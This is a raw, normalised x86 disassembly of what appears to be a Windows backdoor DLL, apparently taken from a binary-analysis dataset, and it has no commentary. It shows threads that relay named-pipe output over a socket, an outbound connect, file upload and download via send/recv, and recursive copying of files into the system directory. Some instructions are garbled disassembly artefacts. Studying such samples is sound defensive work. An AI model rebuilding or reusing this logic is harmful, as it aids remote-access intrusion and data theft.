mov esi rw-data
xor eax eax
[ esi ] [ edi ]
jne r-xdata
jne r-xdata
mov edx rw-data
mov eax rw-data
mov cx [ eax ]
cmp cx [ edx ]
jne r-xdata
lea ecx [ ebp - 0x250c ]
push ecx
push 0x0
push rw-data
push sub_71007010
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jmp r-xdata
nop
clc
jae r-xdata
lea edx [ ebp - 0x250c ]
push edx
push 0x0
push rw-data
push sub_71005e80
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
jne r-xdata
mov eax rw-data
mov ecx rw-data
mov dx [ ecx ]
cmp dx [ eax ]
jne r-xdata
call 0x15d0fa4f
add [ ecx - 0x47 ] dh
insb
das
add [ ecx + 0x66 ] esi
mov edx [ ecx ]
mov ecx 0x3
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
jne r-xdata
lea eax [ ebp - 0x250c ]
push eax
push 0x0
push rw-data
push r-xdata
push 0x0
push 0x0
call [ CreateThread@IAT ]
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
je r-xdata
call sub_710010c0
mov edi eax
mov edx rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov eax ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xffffffff
push ecx
push rw-data
push rw-data
call sub_71001f60
add esp 0xc
mov [ rw-data ] eax
mov ecx [ rw-data ]
push ecx
push rw-data
mov edx [ rw-data ]
push edx
call sub_71007550
add esp 0xc
cmp eax 0x1
jge r-xdata
jne r-xdata
mov ecx 0x3
jne r-xdata
jmp r-xdata
call shutdown
mov ecx [ rw-data ]
push ecx
call closesocket
push 0x4e20
call [ Sleep@IAT ]
jmp r-xdata
push 0x0
mov eax [ rw-data ]
push eax
mov edi rw-data
mov esi rw-data
xor edx edx
[ esi ] [ edi ]
0x3b9e8 0x0
sub_71004b30
sub esp 0x94
lea eax [ esp ]
mov [ esp ] 0x94
push eax
call [ GetVersionExA@IAT ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
or eax 0xffffffff
add esp 0x94
retn
xor ecx ecx
cmp eax 0x2
sete cl
mov eax ecx
add esp 0x94
retn
or eax 0xffffffff
add esp 0x94
retn
sub_71004b80
push esi
mov esi [ Sleep@IAT ]
push 0xc350
call esi
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push 0x1
push rw-data
push eax
call send
cmp eax 0x1
jl r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
pop esi
retn
sub_71004bd0
sub esp 0x120
mov edx [ esp + 0x124 ]
xor eax eax
push ebx
push esi
mov [ esp + 0x8 ] eax
push edi
mov [ esp + 0x10 ] eax
mov edi edx
or ecx 0xffffffff
add edx 0x7
[ edi ]
not ecx
add ecx 0xfffffff8
mov [ esp + 0x14 ] ax
push ecx
lea ecx [ esp + 0x10 ]
push edx
push ecx
call [ strncpy@IAT ]
push rw-data
push rw-data
call [ fopen@IAT ]
add esp 0x14
lea edx [ esp + 0xc ]
mov esi eax
push edx
push rw-data
push esi
call [ fprintf@IAT ]
push esi
call [ fclose@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x10
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov edi [ GetDiskFreeSpaceA@IAT ]
mov esi [ Sleep@IAT ]
lea edx [ esp + 0x28 ]
push 0x104
push edx
call [ _getcwd@IAT ]
mov esi [ _chdir@IAT ]
lea eax [ esp + 0x14 ]
push eax
call esi
call sub_71004ce0
lea ecx [ esp + 0x34 ]
push ecx
call esi
add esp 0x10
pop edi
pop esi
pop ebx
add esp 0x120
retn
push 0x2710
call esi
jmp r-xdata
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x20 ]
push eax
lea edx [ esp + 0x1c ]
push ecx
lea eax [ esp + 0x24 ]
push edx
lea ecx [ esp + 0x18 ]
push eax
push ecx
call edi
test eax eax
jne r-xdata
sub_71004ce0
sub esp 0x428
push esi
lea eax [ esp + 0x328 ]
push 0x104
push eax
call [ GetSystemDirectoryA@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push rw-data
call [ _findfirst@IAT ]
mov esi eax
add esp 0x8
cmp esi 0xffffffff
mov [ esp + 0x4 ] esi
je r-xdata
pop esi
add esp 0x428
retn
push ebx
push ebp
lea edx [ esp + 0x24 ]
push edi
push edx
call [ GetFileAttributesA@IAT ]
mov ebx [ _getcwd@IAT ]
mov ebp [ strstr@IAT ]
test al 0x10
je r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x28 ] 0x2e
je r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x12c ]
lea edx [ esp + 0x12c ]
push 0x104
push edx
[ edi ]
call ebx
or ecx 0xffffffff
mov edi rw-data
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x12c ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x12c ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x230 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x41
lea edi [ esp + 0x230 ]
[ edi ]
lea edi [ esp + 0x334 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x230 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x230 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x230 ]
and ecx 0x3
push 0x1
[ edi ] [ esi ]
lea ecx [ esp + 0x130 ]
push eax
push ecx
call [ CopyFileA@IAT ]
push 0x32
call [ Sleep@IAT ]
mov esi [ esp + 0x10 ]
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
push esi
call [ _findnext@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov edi [ _chdir@IAT ]
lea eax [ esp + 0x28 ]
push eax
call edi
call sub_71004ce0
push rw-data
call edi
add esp 0x8
jmp r-xdata
push esi
call [ _findclose@IAT ]
add esp 0x4
pop edi
pop ebp
pop ebx
lea eax [ esp + 0x28 ]
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
je r-xdata
sub_71004f8a
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
je r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x28 ] 0x2e
je r-xdata
mov ecx 0x41
xor eax eax
lea edi [ esp + 0x12c ]
push 0x104
[ edi ]
lea eax [ esp + 0x130 ]
push eax
call ebx
or ecx 0xffffffff
mov edi rw-data
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x12c ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x12c ]
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
lea edi [ esp + 0x28 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x230 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx 0x41
lea edi [ esp + 0x230 ]
[ edi ]
lea edi [ esp + 0x334 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x230 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x230 ]
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x230 ]
and ecx 0x3
push 0x1
[ edi ] [ esi ]
lea ecx [ esp + 0x130 ]
push eax
push ecx
call [ CopyFileA@IAT ]
push 0x32
call [ Sleep@IAT ]
mov esi [ esp + 0x10 ]
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x14 ]
push edx
push esi
call [ _findnext@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov edi [ _chdir@IAT ]
lea ecx [ esp + 0x28 ]
push ecx
call edi
call sub_71004ce0
push rw-data
call edi
add esp 0x8
jmp r-xdata
lea eax [ esp + 0x28 ]
push esi
call [ _findclose@IAT ]
add esp 0x4
pop edi
pop ebp
pop ebx
pop esi
add esp 0x428
retn
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push rw-data
push eax
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x28 ]
push rw-data
push ecx
call ebp
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x28 ]
push rw-data
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
sub_71005200
push ebp
mov ebp esp
mov eax 0x4004
call sub_71007cf0
push ebx
push esi
push edi
jmp r-xdata
mov edx [ rw-data ]
xor eax eax
mov ecx 0x800
lea edi [ ebp - 0x2004 ]
push eax
push eax
[ edi ]
lea eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x2004 ]
push eax
push 0x1fec
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
push 0x0
call [ ExitThread@IAT ]
mov ebx [ ReadFile@IAT ]
push 0x32
call [ Sleep@IAT ]
mov edx [ rw-data ]
lea eax [ ebp - 0x4 ]
push 0x0
push eax
lea ecx [ ebp - 0x2004 ]
push 0x1fec
push ecx
push edx
call ebx
mov ecx 0x800
xor eax eax
mov edi rw-data
lea esi [ ebp - 0x2004 ]
[ edi ]
mov eax [ ebp - 0x4 ]
mov edi rw-data
mov ecx eax
push eax
mov edx ecx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call sub_71001f60
mov edx eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x4004 ]
[ edi ]
mov ecx edx
mov esi rw-data
mov eax ecx
lea edi [ ebp - 0x4004 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add esp 0xc
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov ecx 0x800
mov edi rw-data
push edx
push rw-data
[ edi ]
push rw-data
mov [ rw-data ] edx
mov esi edx
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
add esp 0x18
mov [ rw-data ] eax
push 0x0
push eax
push rw-data
push ecx
call send
cmp eax 0x1
jl r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jbe r-xdata
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
call closesocket
mov eax [ rw-data ]
lea edx [ ebp - 0x4004 ]
push esi
push edx
push eax
mov [ rw-data ] 0x0
call sub_71007550
add esp 0xc
cmp eax 0x1
jl r-xdata
push 0x5
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
jmp r-xdata
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
lea edx [ ebp - 0x2004 ]
push 0x1fec
push edx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
sub_71005213
jmp r-xdata
jne r-xdata
sar [ ecx + 0x800 ] 0x8d
mov ebp 0xffffdffc
je r-xdata
mov edx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
push 0x0
call [ ExitThread@IAT ]
mov ebx [ ReadFile@IAT ]
push eax
push eax
[ edi ]
lea eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x2004 ]
push eax
push 0x1fec
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
xor eax eax
mov ecx 0x800
lea edi [ ebp - 0x2004 ]
push 0x32
call [ Sleep@IAT ]
mov edx [ rw-data ]
lea eax [ ebp - 0x4 ]
push 0x0
push eax
lea ecx [ ebp - 0x2004 ]
push 0x1fec
push ecx
push edx
call ebx
mov ecx 0x800
xor eax eax
mov edi rw-data
lea esi [ ebp - 0x2004 ]
[ edi ]
mov eax [ ebp - 0x4 ]
mov edi rw-data
mov ecx eax
push eax
mov edx ecx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call sub_71001f60
mov edx eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x4004 ]
[ edi ]
mov ecx edx
mov esi rw-data
mov eax ecx
lea edi [ ebp - 0x4004 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add esp 0xc
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov ecx 0x800
mov edi rw-data
push edx
push rw-data
[ edi ]
push rw-data
mov [ rw-data ] edx
mov esi edx
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
add esp 0x18
mov [ rw-data ] eax
push 0x0
push eax
push rw-data
push ecx
call send
cmp eax 0x1
jl r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jbe r-xdata
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
call closesocket
mov eax [ rw-data ]
lea edx [ ebp - 0x4004 ]
push esi
push edx
push eax
mov [ rw-data ] 0x0
call sub_71007550
add esp 0xc
cmp eax 0x1
jl r-xdata
push 0x5
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
jmp r-xdata
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
lea edx [ ebp - 0x2004 ]
push 0x1fec
push edx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
sub_7100521a
push [ ebp + 0x9 ]
je r-xdata
sar [ ecx + 0x800 ] 0x8d
mov ebp 0xffffdffc
push eax
push eax
[ edi ]
lea eax [ ebp - 0x4 ]
lea ecx [ ebp - 0x2004 ]
push eax
push 0x1fec
push ecx
push edx
call [ PeekNamedPipe@IAT ]
test eax eax
je r-xdata
mov edx [ rw-data ]
xor eax eax
mov ecx 0x800
lea edi [ ebp - 0x2004 ]
mov edx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
push 0x0
call [ ExitThread@IAT ]
mov ebx [ ReadFile@IAT ]
push 0x32
call [ Sleep@IAT ]
mov edx [ rw-data ]
lea eax [ ebp - 0x4 ]
push 0x0
push eax
lea ecx [ ebp - 0x2004 ]
push 0x1fec
push ecx
push edx
call ebx
mov ecx 0x800
xor eax eax
mov edi rw-data
lea esi [ ebp - 0x2004 ]
[ edi ]
mov eax [ ebp - 0x4 ]
mov edi rw-data
mov ecx eax
push eax
mov edx ecx
push rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push rw-data
and ecx 0x3
[ edi ] [ esi ]
call sub_71001f60
mov edx eax
mov ecx 0x800
xor eax eax
lea edi [ ebp - 0x4004 ]
[ edi ]
mov ecx edx
mov esi rw-data
mov eax ecx
lea edi [ ebp - 0x4004 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add esp 0xc
and ecx 0x3
xor eax eax
[ edi ] [ esi ]
mov ecx 0x800
mov edi rw-data
push edx
push rw-data
[ edi ]
push rw-data
mov [ rw-data ] edx
mov esi edx
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
add esp 0x18
mov [ rw-data ] eax
push 0x0
push eax
push rw-data
push ecx
call send
cmp eax 0x1
jl r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
jbe r-xdata
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
call closesocket
mov eax [ rw-data ]
lea edx [ ebp - 0x4004 ]
push esi
push edx
push eax
mov [ rw-data ] 0x0
call sub_71007550
add esp 0xc
cmp eax 0x1
jl r-xdata
push 0x5
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call shutdown
mov ecx [ rw-data ]
push ecx
jmp r-xdata
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x0
push ecx
lea edx [ ebp - 0x2004 ]
push 0x1fec
push edx
push eax
call [ PeekNamedPipe@IAT ]
test eax eax
jne r-xdata
sub_71005420
mov edx [ esp + 0x4 ]
push edi
lea eax [ esp + 0x8 ]
push 0x0
push eax
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
mov ecx [ rw-data ]
push edx
push ecx
call [ WriteFile@IAT ]
test eax eax
setne al
pop edi
retn
sub_71005450
mov eax 0x223c
call sub_71007cf0
push ebx
push ebp
push esi
push edi
push 0x64
mov [ esp + 0x28 ] 0x12c
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x17 ] 0x0
call [ malloc@IAT ]
mov edx [ esp + 0x2254 ]
mov ebx eax
mov ecx 0x19
xor eax eax
mov edi ebx
add esp 0x4
[ edi ]
mov ecx 0x3
mov edi rw-data
mov esi edx
xor eax eax
[ esi ] [ edi ]
mov [ esp + 0x14 ] ebx
jne r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffff6
add edx 0x9
push ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0xfffffff8
mov [ esp + 0x13 ] 0x1
push ecx
add edx 0x7
jmp r-xdata
push rw-data
call [ atol@IAT ]
add esp 0x4
push eax
call htons
push rw-data
mov [ esp + 0x3a ] ax
mov [ esp + 0x38 ] 0x2
call inet_addr
lea ecx [ esp + 0x34 ]
push 0x10
push ecx
push ebp
mov [ esp + 0x44 ] eax
call connect
mov edx eax
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
mov edi rw-data
test edx edx
[ edi ]
je r-xdata
push 0x0
call [ ExitThread@IAT ]
push edx
push ebx
call [ strncpy@IAT ]
add esp 0xc
push 0x0
push 0x1
push 0x2
call socket
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
push eax
push rw-data
push ebp
mov [ rw-data ] eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jl r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov [ rw-data ] eax
push eax
mov eax [ rw-data ]
push rw-data
push eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jge r-xdata
push 0x0
push ebp
call shutdown
push ebp
call closesocket
pop edi
pop esi
pop ebp
pop ebx
add esp 0x223c
retn
mov ecx 0x800
xor eax eax
mov edi rw-data
[ edi ]
mov ecx 0x800
mov edi rw-data
[ edi ]
mov al [ esp + 0x13 ]
cmp al 0x1
jne r-xdata
push ebx
call [ free@IAT ]
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
pop edi
pop esi
pop ebp
pop ebx
add esp 0x223c
retn
test al al
jne r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
push ebx
call [ CreateFileA@IAT ]
mov esi eax
test esi esi
mov [ esp + 0x14 ] esi
je r-xdata
push ebp
call closesocket
push ebx
call [ free@IAT ]
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push ebx
call [ CreateFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov ecx [ rw-data ]
push eax
push rw-data
push ecx
mov [ rw-data ] eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jge r-xdata
xor ebx ebx
mov [ esp + 0x20 ] ebx
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov [ rw-data ] eax
push eax
mov eax [ rw-data ]
push rw-data
push eax
call sub_71007550
add esp 0x18
cmp eax 0x1
jge r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push ebx
call [ GetFileSize@IAT ]
mov edi [ esp + 0x20 ]
mov [ esp + 0x1c ] eax
mov esi eax
pop edi
xor eax eax
pop esi
pop ebp
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebx
add esp 0x223c
retn
mov edx [ rw-data ]
xor esi esi
push esi
push edx
call shutdown
mov eax [ rw-data ]
push eax
call closesocket
jmp r-xdata
and eax ecx
cmp eax 0xffffffff
jne r-xdata
jl r-xdata
mov ebx [ esp + 0x14 ]
mov [ rw-data ] 0xfffffffe
mov [ rw-data ] 0xffffffff
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
sub esi eax
sbb edi ecx
and eax ecx
cmp eax 0xffffffff
mov [ esp + 0x30 ] edi
je r-xdata
jl r-xdata
mov [ rw-data ] esi
mov [ rw-data ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x223c
retn
mov edi [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
push ebp
call closesocket
pop edi
pop esi
pop ebp
pop ebx
add esp 0x223c
retn
and eax ecx
cmp eax 0xffffffff
je r-xdata
test eax eax
ja r-xdata
push ebx
call [ CloseHandle@IAT ]
push 0x64
call [ Sleep@IAT ]
push edi
push esi
push rw-data
push rw-data
call [ sprintf@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call sub_71001f60
mov [ rw-data ] eax
push eax
mov eax [ rw-data ]
push rw-data
push eax
call sub_71007550
add esp 0x28
cmp eax 0x1
jge r-xdata
mov edx eax
or edx ecx
je r-xdata
test eax eax
ja r-xdata
push 0xc8
call [ Sleep@IAT ]
mov edx [ esp + 0x14 ]
push edx
call [ CloseHandle@IAT ]
test eax eax
je r-xdata
push 0xc8
call [ Sleep@IAT ]
jmp r-xdata
or esi [ esp + 0x30 ]
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call shutdown
mov edx [ rw-data ]
push edx
call closesocket
push ebx
call [ CloseHandle@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x223c
retn
and eax ecx
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x44 ]
push eax
push ebp
call __WSAFDIsSet
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
test ecx ecx
jg r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x0
push eax
push ecx
push ebx
call sub_71007c80
mov esi [ ReadFile@IAT ]
add esp 0x10
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov eax [ rw-data ]
add ebx edx
adc ecx 0x0
cmp ebx eax
mov [ esp + 0x20 ] ecx
jne r-xdata
push esi
lea ecx [ esp + 0x250 ]
push 0x2000
push ecx
push ebp
call recv
mov esi eax
push 0x0
test esi esi
jle r-xdata
push ebx
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
pop edi
pop esi
pop ebp
mov [ rw-data ] 0xfffffffe
pop ebx
add esp 0x223c
retn
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
test ecx ecx
jg r-xdata
test esi esi
jle r-xdata
mov eax [ rw-data ]
mov edx ecx
cmp edx eax
je r-xdata
push ebp
call shutdown
push ebp
call closesocket
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x1c ]
push edx
lea eax [ esp + 0x254 ]
push esi
push eax
push ecx
call edi
mov eax [ esp + 0x18 ]
test eax eax
